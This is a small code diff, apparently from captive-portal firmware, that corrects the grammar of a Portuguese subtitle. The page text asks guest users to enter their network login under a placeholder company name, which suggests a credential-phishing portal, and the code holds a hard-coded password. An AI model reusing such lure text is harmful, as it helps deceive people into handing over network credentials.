@@ -14,7 +14,7 @@
 const char* PASSWORD = "P@ssw0rd!";
 
 // Textos padrão.
-#define SUBTITLE "A internet do EMPRESA!"
+#define SUBTITLE "A internet da EMPRESA!"
 #define TITLE "Acesso GUEST"
 #define BODY "Para se conectar a nossa rede insira seu login de rede. Aproveite a internet mais rápida da EMPRESA!"
 #define POST_TITLE "Conectando..."
